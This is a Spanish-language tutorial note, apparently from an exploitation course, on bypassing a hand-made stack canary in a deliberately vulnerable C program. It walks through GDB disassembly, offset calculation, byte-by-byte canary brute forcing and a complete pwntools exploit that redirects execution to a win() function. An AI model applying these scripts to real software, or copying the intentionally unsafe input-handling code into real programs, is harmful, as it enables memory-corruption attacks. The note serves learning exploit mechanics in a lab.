# Clase 4: Custom Canary / Stack Canary Protection

#StackCanary #CanaryBypass #BufferOverflow #BruteForce #StackProtection #ExploitDevelopment #BinaryExploitation #GDB #Pwntools #ELF #x64Assembly #ReturnAddress #BasePointer #ASLR

---

## Comando de Compilación

```bash
gcc -g main.c -o main -fno-stack-protector -z execstack -no-pie -Wl,-z,norelro
```

---

## ¿Qué es el Canary?

El **canary** es una protección anti buffer overflows en el stack. Pone un valor aleatorio encima del `ebp` (base pointer).

---

## Variables Globales vs Stack

Las **variables globales** (las que están fuera de una función hasta arriba) **no se guardan adentro del stack** sino que se guardan en `.data`. Se vería de esta forma:

```
canary_copy      <-- .data


buff
buff
canary           <-- stack
ebp
main
```

---

## Funcionamiento del Canary

El compilador, cuando una función o método lee input del usuario, lo que hace es que al principio le agrega un canary, y después de ejecutar la función como `gets` hace una comprobación de alteración.

---

## Código para Detectar el Canary

Hacemos el siguiente código en C para detectar el canary:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char canary_copy[8];

void vuln() {
    char canary[8];
    strncpy(canary, "pajarito", 8);

    for (int i = 0; i < 8; i++) {
        canary_copy[i] = canary[i];
    }

    char buf[16];
    int cambiado = 0;

    gets(buf);

    for (int i = 0; i < 8; i++) {
        if (canary_copy[i] != canary[i]) {
            cambiado = 1;
        }
    }

    if (cambiado) {
        puts("STACK SMASHING DETECTED");
        exit(1);
    }
}

int main() {
    vuln();
    puts("todo bien");

    return 0;
}
```

Cuando cambia es porque el original ya no es como la copia porque sobrepasamos el buffer sobre escribiendo al canary generado antes de mandar a llamar una entrada al usuario.

---

## Tipos de Canary

Hay 2 tipos de canary:

- La mayoría es del tipo **aleatorio** que siempre cambia
- Veremos el que **no cambia** que es el más simple, como en este caso que estamos asignándole el valor de "pajarito" de manera directa

---

## Ataque de Fuerza Bruta (Canary Estático)

Entonces cuando el canary es fijo hacemos un **ataque de fuerza bruta**. Vamos a compilar este código y ver `vuln` en GDB:

```bash
gcc -g main.c -o main -fno-stack-protector -z execstack -no-pie -Wl,-z,norelro
```

### Código Completo para Análisis

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

char canary_copy[8];
int cambiado = 0;

void win() {
    puts("Ganaste");
}

void vuln() {
    char canary[8];
    strncpy(canary, "pajarito", 8); <- copea en "canary" "[pajarito]\00" 8 bits
    
    for (int i = 0; i < 8; i++) {
        canary_copy[i] = canary[i];
    }
    
    char buf[16];
    buf[0] = 'a';

    int archivo = open("input.txt", O_RDONLY);
    read(archivo, buf, 0xff);
    
    for (int i = 0; i < 8; i++) {
        if (canary_copy[i] != canary[i]) {
            cambiado = 1;
        }
    }
    
    if (cambiado) {
        puts("STACK SMASHING DETECTED");
        exit(1);
    }
}

int main() {
    vuln();
    puts("Todo bien");
    return 0;
}
```

---

## Disassemble de vuln()

```nasm
gef➤  disassemble vuln 
Dump of assembler code for function vuln:
   0x000000000040116c <+0>:     push   rbp
   0x000000000040116d <+1>:     mov    rbp,rsp
   0x0000000000401170 <+4>:     sub    rsp,0x30
   0x0000000000401174 <+8>:     movabs rax,0x6f746972616a6170  <-- Este es nuestro canary original (podemos traducir esta en Hex y al revés por el little endian)
   0x000000000040117e <+18>:    mov    QWORD PTR [rbp-0x14],rax <-- aquí se indexa nuestro canary
   0x0000000000401182 <+22>:    mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000401189 <+29>:    jmp    0x4011a8 <vuln+60>
   0x000000000040118b <+31>:    mov    eax,DWORD PTR [rbp-0x4]
   0x000000000040118e <+34>:    cdqe
   0x0000000000401190 <+36>:    movzx  edx,BYTE PTR [rbp+rax*1-0x14]
   0x0000000000401195 <+41>:    mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401198 <+44>:    cdqe
   0x000000000040119a <+46>:    lea    rcx,[rip+0x221f]        # 0x4033c0 <canary_copy> <-- aquí la copia siempre en .data con dirección fija
   0x00000000004011a1 <+53>:    mov    BYTE PTR [rax+rcx*1],dl
   0x00000000004011a4 <+56>:    add    DWORD PTR [rbp-0x4],0x1
   0x00000000004011a8 <+60>:    cmp    DWORD PTR [rbp-0x4],0x7
   0x00000000004011ac <+64>:    jle    0x40118b <vuln+31>
   0x00000000004011ae <+66>:    mov    BYTE PTR [rbp-0x30],0x61 <-- Buffer
   0x00000000004011b2 <+70>:    mov    esi,0x0
   0x00000000004011b7 <+75>:    lea    rax,[rip+0xe52]        # 0x40200c
   0x00000000004011be <+82>:    mov    rdi,rax
   0x00000000004011c1 <+85>:    mov    eax,0x0
   0x00000000004011c6 <+90>:    call   0x401050 <open@plt>
   0x00000000004011cb <+95>:    mov    DWORD PTR [rbp-0xc],eax
   0x00000000004011ce <+98>:    lea    rcx,[rbp-0x30]
   0x00000000004011d2 <+102>:   mov    eax,DWORD PTR [rbp-0xc]
   0x00000000004011d5 <+105>:   mov    edx,0xff
   0x00000000004011da <+110>:   mov    rsi,rcx
   0x00000000004011dd <+113>:   mov    edi,eax
   0x00000000004011df <+115>:   call   0x401040 <read@plt>
   0x00000000004011e4 <+120>:   mov    DWORD PTR [rbp-0x8],0x0
   0x00000000004011eb <+127>:   jmp    0x401215 <vuln+169>
   0x00000000004011ed <+129>:   mov    eax,DWORD PTR [rbp-0x8]
   0x00000000004011f0 <+132>:   cdqe
   0x00000000004011f2 <+134>:   lea    rdx,[rip+0x21cb]        # 0x4033c0 <canary_copy>
   0x00000000004011f9 <+141>:   movzx  edx,BYTE PTR [rax+rdx*1]
   0x00000000004011fd <+145>:   mov    eax,DWORD PTR [rbp-0x8]
   0x0000000000401200 <+148>:   cdqe
   0x0000000000401202 <+150>:   movzx  eax,BYTE PTR [rbp+rax*1-0x14]
   0x0000000000401207 <+155>:   cmp    dl,al
   0x0000000000401209 <+157>:   je     0x401211 <vuln+165>
   0x000000000040120b <+159>:   mov    DWORD PTR [rip+0x21b7],0x1        # 0x4033c8 <cambiado>
   0x0000000000401215 <+169>:   add    DWORD PTR [rbp-0x8],0x1
   0x0000000000401219 <+173>:   cmp    DWORD PTR [rbp-0x8],0x7
   0x000000000040121d <+177>:   jle    0x4011ed <vuln+129>
   0x000000000040121f <+179>:   mov    eax,DWORD PTR [rip+0x21a7]        # 0x4033c8 <cambiado>
   0x0000000000401225 <+185>:   test   eax,eax
   0x0000000000401227 <+187>:   je     0x40123e <vuln+210>
   0x0000000000401229 <+189>:   lea    rax,[rip+0xdea]        # 0x402016
   0x0000000000401230 <+196>:   mov    rdi,rax
   0x0000000000401233 <+199>:   call   0x401030 <puts@plt>
   0x0000000000401238 <+204>:   mov    edi,0x1
   0x000000000040123d <+209>:   call   0x401060 <exit@plt>
   0x0000000000401242 <+214>:   nop
   0x0000000000401243 <+215>:   leave
   0x0000000000401244 <+216>:   ret
End of assembler dump.
gef➤  
```

---

## Cálculo de Distancia

Calculamos la distancia entre el buffer (la 'a' que insertamos) y el canary:

```
buf         0x30    Distancia0x30-0x14=28
            
            
            
canary      0x14    
int misterioso          
rbp         
main            
```

Así que eso soporta hasta estar bien sin que nos detecte el canary. Entonces metemos eso en A al `input.txt`:

```bash
python2 -c "print b'A'*28" > input.txt
```

> **Nota:** El `b""`/`b''` es para indicar que es un bytestring

**Cuidado con el salto de línea**

Ejecutamos `./main` y debería salir "Todo bien".

---

## Ataque de Fuerza Bruta Carácter por Carácter

Ahora aquí entraría el ataque de fuerza bruta porque si metemos al input otro carácter imprimirá que crashea, más si bruteforceamos y metemos un carácter de lo que queremos likear, en este caso "pajarito", si metemos una 'p', el canary no detectará que la copia está mal pues 'p' está en el canary, es decir es igual (se sobrescribiría la p con otra p no cambios detectados) y no dirá nada y así podemos armarla:

```bash
┌──(kali㉿kali)-[~/Documents/pwn/eliasCodesPruebas/4]
└─$ echo -n "AAAAAAAAAAAAAAAAAAAAAAAAAAAAp" > input.txt
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Documents/pwn/eliasCodesPruebas/4]
└─$ ./main                                             
Todo bien
```

Así podríamos seguir a mano pero es mejor hacer un script. Bueno, ya pasando "pajarito" podemos controlar lo que queramos pues el canary ya esta cubierto.

---

## Análisis con Breakpoint en read()

Bueno ponemos un breakpoint donde se llama la función `read`:

```nasm
0x00000000004011db <+111>:   call   0x401040 <read@plt>
```

```bash
b *0x00000000004011db
```

Damos `c` si pusimos otro breakpoint para llegar allí y ver cómo se llena todo dando `n` (antes de eso al `input.txt` le ponemos las A y "pajarito"):

### Vista del Stack

Así se muestra el stack, los `41` son las A:

```
0x00007fffffffdc80│+0x0000: 0x4141414141414141   ← $rsp, $rsi
0x00007fffffffdc88│+0x0008: 0x4141414141414141
0x00007fffffffdc90│+0x0010: 0x4141414141414141
0x00007fffffffdc98│+0x0018: 0x616a617041414141
0x00007fffffffdca0│+0x0020: 0x000000036f746972 <-- Tenemos que reescribir esos 0
0x00007fffffffdca8│+0x0028: 0x00000008f7fe4780 <-- Y esos también
0x00007fffffffdcb0│+0x0030: 0x00007fffffffdcc0  →  0x0000000000000001    ← $rbp
0x00007fffffffdcb8│+0x0038: 0x0000000000401253  →  <main+000e> lea rax, [rip+0xdd4]        # 0x40202e
```

Haciendo eso ya podríamos sobreescribir en la dirección de Main la dirección de la función de `win`.

---

## Cálculo del Offset Total

Nuestro canary está aquí:

```nasm
0x000000000040117e <+18>:    mov    QWORD PTR [rbp-0x14],rax
```

`0x14` = 20 y por x86_64 registros que mide 8

Como debemos ocupar los del canary son 20 - 8, pero a su vez ocupamos sobreescribir el base pointer `rbp` se le suman 8.

Entonces quedarían los mismos 20, entonces le agregamos 20 A a nuestro input quedando así:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAApajaritoAAAAAAAAAAAAAAAAAAAA
```

Ahora queda el stack así:

```
0x00007fffffffdc80│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAApajaritoAAAAAAAAAAAAAA[...]"    ← $rsp, $rsi
0x00007fffffffdc88│+0x0008: 0x4141414141414141
0x00007fffffffdc90│+0x0010: 0x4141414141414141
0x00007fffffffdc98│+0x0018: 0x616a617041414141
0x00007fffffffdca0│+0x0020: 0x414141416f746972
0x00007fffffffdca8│+0x0028: 0x4141414141414141
0x00007fffffffdcb0│+0x0030: 0x4141414141414141   ← $rbp
0x00007fffffffdcb8│+0x0038: 0x0000000000401253  →  <main+000e> lea rax, [rip+0xdd4]        # 0x40202e
```

---

## Sobreescribir Return Address con win()

Solo queda sobreescribir main con la dirección de `win`, entonces hacemos un:

```bash
disassemble win
```

```nasm
gef➤  disassemble win
Dump of assembler code for function win:
   0x0000000000401156 <+0>:     push   rbp
   0x0000000000401157 <+1>:     mov    rbp,rsp
   0x000000000040115a <+4>:     lea    rax,[rip+0xea3]        # 0x402004
   0x0000000000401161 <+11>:    mov    rdi,rax
   0x0000000000401164 <+14>:    call   0x401030 <puts@plt>
   0x0000000000401169 <+19>:    nop
   0x000000000040116a <+20>:    pop    rbp
   0x000000000040116b <+21>:    ret
End of assembler dump.
gef➤  
```

Dirección: `0000000000401156`

Podemos buscar un convertidor en línea de esta forma:

**Big endian to little endian converter:** https://www.save-editor.com/tools/wse_hex.html
#little_emdian_to_big

Nos da:

```
5611400000000000
```

Ahora que sobreescribir eso con los `\x` para los valores ASCII:

```
\x56\x11\x40\x00\x00\x00\x00\x00
```

Así que ponemos eso en el input:

```bash
printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAApajaritoAAAAAAAAAAAAAAAAAAAA\x56\x11\x40\x00\x00\x00\x00\x00" > input.txt
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Documents/pwn/eliasCodesPruebas/4]
└─$ cat input.txt 
AAAAAAAAAAAAAAAAAAAAAAAAAAAApajaritoAAAAAAAAAAAAAAAAAAAAV@                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Documents/pwn/eliasCodesPruebas/4]
└─$ ./main 
Ganaste
zsh: segmentation fault  ./main
```

E invocamos `main` al sobreescribir el return address de `main` por el de `win`. Así sería con un canary estático.

---

## Canary Aleatorio con Script Pwntools

Ahora con un **Canary aleatorio** y script usando pwntools:

### Código Modificado

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

char canary_copy[8];
int cambiado = 0;

void win() {
    puts("Ganaste");
}

void vuln() {
    char canary[8];
    strncpy(canary, "piolin77", 8);
    
    for (int i = 0; i < 8; i++) {
        canary_copy[i] = canary[i];
    }
    
    char buf[16];
    buf[0] = 'a';
    
    int zzz = 0; <-- para que las direcciones de memoria estén igual le damos un remplazo xd
    read(STDIN_FILENO, buf, 0xff); <-- Cambio (borramos el archivo del que leería)
    
    for (int i = 0; i < 8; i++) {
        if (canary_copy[i] != canary[i]) {
            cambiado = 1;
        }
    }
    
    if (cambiado) {
        puts("STACK SMASHING DETECTED");
        exit(1);
    }
}

int main() {
    vuln();
    puts("Todo bien");
    return 0;
}
```

---

## Script de Brute Force con Pwntools

La verdad es que pwntools facilita mucho el trabajo de andar recogiendo las direcciones de las funciones, etc.

```python
from pwn import *
from string import ascii_lowercase, digits

binario = ELF("./main") <-- Extraer Función de ejecutable Linux (ELF)

win = binario.symbols["win"] <-- Extraer direccion de simbolo win 

payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAA"

canary = b""
while len(canary) < 8:

    for caracter in ascii_lowercase + digits:
        p = process(binario.path)

        tosend = payload + canary + caracter.encode()

        p.send(tosend)

        try:
            p.recvuntil(b"Todo bien")

            canary += caracter.encode()
            print("CANARIO", canary)
            break
        except:
            pass
        p.close()

print(canary)
```

---

## ¿Cómo Funciona?

1. Prueba cada letra y número (a-z, 0-9) en cada posición donde inicia el canario (después de las 28 A que habíamos sacado antes que está como payload ahora)
    
2. Si el programa responde "Todo bien" = la letra es correcta
    
3. Si el programa se cierra = la letra es incorrecta, prueba la siguiente
    

### Al Ejecutar:

```
CANARIO b'piolin77'
b'piolin77'
[*] Process '/home/kali/Documents/pwn/eliasCodesPruebas/4/main' stopped with exit code 0 (pid 81133)
[*] Process '/home/kali/Documents/pwn/eliasCodesPruebas/4/main' stopped with exit code 0 (pid 81107)
```

`piolin77` es nuestro canario.

---

## Exploit Completo

Ahora solo falta completar el exploit armando el payload con el canario, las 20 A del cálculo que sacamos bastante arriba y la dirección de `win` que con pwntools la podemos sacar fácilmente:

```python
from pwn import *
from string import ascii_lowercase, digits

binario = ELF("./main")

win = binario.symbols["win"]

payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAA"

canary = b""
while len(canary) < 8:

    for caracter in ascii_lowercase + digits:
        p = process(binario.path)

        tosend = payload + canary + caracter.encode()

        p.send(tosend)

        try:
            p.recvuntil(b"Todo bien")

            canary += caracter.encode()
            print("CANARIO", canary)
            break
        except:
            pass
        p.close()

payload += canary
payload += b"A" * 20
payload += p64(win) <-- así se indica es dirección de 64 bytes y queremos la de win

p = process(binario.path)

p.send(payload)

p.interactive()
```

### Ejecutamos y:

```
CANARIO b'piolin77'
[+] Starting local process '/home/kali/Documents/pwn/eliasCodesPruebas/4/main': pid 85250
[*] Switching to interactive mode
Ganaste <-- Ganamos
```

---

## Nota Final

Bueno esto sirvió para explicar, porque en verdad el canary son valores hexadecimales bastante grandes y el orden de la pila es:

```
buf


canary
rbp
main
```

**El chiste es que el buffer puede escribir y el canary debe mantenerse intacto y triunfaremos.**